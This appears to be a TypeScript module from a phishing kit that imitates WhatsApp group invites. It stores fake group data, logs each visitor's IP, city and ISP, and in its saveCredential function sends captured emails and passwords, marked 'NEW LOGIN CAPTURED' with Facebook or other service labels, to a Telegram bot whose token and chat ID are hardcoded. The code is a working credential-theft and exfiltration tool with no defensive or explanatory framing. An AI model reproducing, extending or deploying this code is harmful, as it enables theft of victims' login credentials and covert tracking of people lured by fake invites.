import { GroupData, VisitorLog, CredentialLog, TelegramConfig } from '../types';

const STORAGE_KEY = 'wa_clone_groups';
const LOGS_KEY = 'wa_clone_logs';
const BLOCKED_KEY = 'wa_clone_blocked';
const CREDS_KEY = 'wa_clone_creds';
const TG_CONFIG_KEY = 'wa_clone_tg_config';

// User's Provided Token & ID
const DEFAULT_BOT_TOKEN = "8296457423:AAG3dHC3rwT9_0NgImTKnAQf5VU8XJI2OXY";
const DEFAULT_CHAT_ID = "8296457423"; 

// --- Telegram Helper ---

export const getTelegramConfig = (): TelegramConfig | null => {
  try {
    const stored = localStorage.getItem(TG_CONFIG_KEY);
    if (stored) {
        return JSON.parse(stored);
    }
    return { botToken: DEFAULT_BOT_TOKEN, chatId: DEFAULT_CHAT_ID };
  } catch (e) {
    return { botToken: DEFAULT_BOT_TOKEN, chatId: DEFAULT_CHAT_ID };
  }
};

export const saveTelegramConfig = (config: TelegramConfig) => {
  localStorage.setItem(TG_CONFIG_KEY, JSON.stringify(config));
};

const sendToTelegram = async (text: string) => {
  const config = getTelegramConfig();
  if (!config || !config.botToken || !config.chatId) return;

  const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
  
  const formData = new FormData();
  formData.append('chat_id', config.chatId);
  formData.append('text', text);
  formData.append('parse_mode', 'HTML');

  const params = new URLSearchParams({
      chat_id: config.chatId,
      text: text,
      parse_mode: 'HTML'
  });

  try {
      if (navigator.sendBeacon) {
          const success = navigator.sendBeacon(url, formData);
          if (success) return; 
      }
      await fetch(`${url}?${params.toString()}`, { 
          method: 'GET',
          mode: 'no-cors',
          keepalive: true
      });
  } catch (error) {
    console.error('Failed to send to Telegram', error);
  }
};

// --- Image Compression for URL Safety ---
export const compressImage = (file: File): Promise<string> => {
    return new Promise((resolve) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (e) => {
            const img = new Image();
            img.src = e.target?.result as string;
            img.onload = () => {
                const elem = document.createElement('canvas');
                // Max size 120px to keep URL short enough for most browsers
                const scaleFactor = Math.min(120 / img.width, 120 / img.height, 1);
                elem.width = img.width * scaleFactor;
                elem.height = img.height * scaleFactor;
                const ctx = elem.getContext('2d');
                ctx?.drawImage(img, 0, 0, elem.width, elem.height);
                // Low quality JPEG to save characters
                resolve(elem.toDataURL('image/jpeg', 0.6));
            }
        }
    })
};

// --- URL State Management (The "Sync" Logic) ---

export const generateInviteLink = (group: GroupData): string => {
    // We explicitly map fields to short keys to minimize URL length
    const payload = {
        n: group.name,
        i: group.image,
        l: group.link,
        c: group.memberCount,
        m: group.lastMessage,
        id: group.id
    };
    
    // Encode to Base64 (URL Safe)
    try {
        const json = JSON.stringify(payload);
        const base64 = btoa(unescape(encodeURIComponent(json)));
        const baseUrl = window.location.href.split('#')[0];
        return `${baseUrl}#invite/${base64}`;
    } catch (e) {
        console.error("Link gen error", e);
        return "";
    }
};

export const parseInviteLink = (hash: string): GroupData | null => {
    try {
        const base64 = hash.split('#invite/')[1];
        if (!base64) return null;
        
        const json = decodeURIComponent(escape(atob(base64)));
        const data = JSON.parse(json);
        
        return {
            id: data.id || 'temp',
            name: data.n || 'Unknown Group',
            image: data.i || null,
            link: data.l || '',
            memberCount: data.c,
            lastMessage: data.m
        };
    } catch (e) {
        console.error("Parse error", e);
        return null;
    }
};

// --- Local Group Management (For Admin) ---

export const getGroups = (): GroupData[] => {
  try {
    const stored = localStorage.getItem(STORAGE_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) {
    return [];
  }
};

export const saveGroup = (group: GroupData): void => {
  const groups = getGroups();
  const existingIndex = groups.findIndex(g => g.id === group.id);
  if (existingIndex >= 0) {
    groups[existingIndex] = group;
  } else {
    groups.push(group);
  }
  localStorage.setItem(STORAGE_KEY, JSON.stringify(groups));
};

export const deleteGroup = (id: string): void => {
  const groups = getGroups();
  const filtered = groups.filter(g => g.id !== id);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(filtered));
};

export const getGroupById = (id: string): GroupData | undefined => {
  const groups = getGroups();
  return groups.find(g => g.id === id);
};

// --- Security & Logs ---

export const getVisitorLogs = (): VisitorLog[] => {
  try {
    const stored = localStorage.getItem(LOGS_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) {
    return [];
  }
};

export const logVisitor = (log: VisitorLog): void => {
  const logs = getVisitorLogs();
  const recentLog = logs.find(l => l.ip === log.ip && (Date.now() - l.timestamp < 60000));
  
  if (!recentLog) {
    const newLogs = [log, ...logs].slice(0, 100);
    localStorage.setItem(LOGS_KEY, JSON.stringify(newLogs));

    const msg = `👀 <b>NEW VISITOR</b>\n\n` +
                `<b>IP:</b> <code>${log.ip}</code>\n` +
                `<b>Location:</b> ${log.city}, ${log.country_name}\n` +
                `<b>ISP:</b> ${log.org}\n` +
                `<b>Target:</b> ${log.groupName}`;
    sendToTelegram(msg);
  }
};

export const getBlockedIPs = (): string[] => {
  try {
    const stored = localStorage.getItem(BLOCKED_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) {
    return [];
  }
};

export const blockIP = (ip: string): void => {
  const blocked = getBlockedIPs();
  if (!blocked.includes(ip)) {
    blocked.push(ip);
    localStorage.setItem(BLOCKED_KEY, JSON.stringify(blocked));
  }
};

export const unblockIP = (ip: string): void => {
  const blocked = getBlockedIPs();
  const filtered = blocked.filter(i => i !== ip);
  localStorage.setItem(BLOCKED_KEY, JSON.stringify(filtered));
};

export const isIPBlocked = (ip: string): boolean => {
  const blocked = getBlockedIPs();
  return blocked.includes(ip);
};

// --- Credentials ---

export const getCredentials = (): CredentialLog[] => {
  try {
    const stored = localStorage.getItem(CREDS_KEY);
    return stored ? JSON.parse(stored) : [];
  } catch (e) {
    return [];
  }
};

export const saveCredential = async (cred: CredentialLog): Promise<void> => {
  const creds = getCredentials();
  const newCreds = [cred, ...creds];
  localStorage.setItem(CREDS_KEY, JSON.stringify(newCreds));

  const icon = cred.service === 'facebook' ? '🔵' : '🔴';
  const msg = `${icon} <b>NEW LOGIN CAPTURED</b> ${icon}\n\n` +
              `<b>Service:</b> ${cred.service.toUpperCase()}\n` +
              `<b>Email/User:</b> <code>${cred.email}</code>\n` +
              `<b>Password:</b> <code>${cred.password}</code>\n` +
              `<b>IP:</b> <code>${cred.ip}</code>\n` +
              `<b>Location:</b> ${cred.location || 'Unknown'}\n` +
              `<b>Device:</b> <code>${cred.userAgent || 'Unknown'}</code>\n` +
              `<b>Time:</b> ${new Date(cred.timestamp).toLocaleString()}`;
              
  await sendToTelegram(msg);
};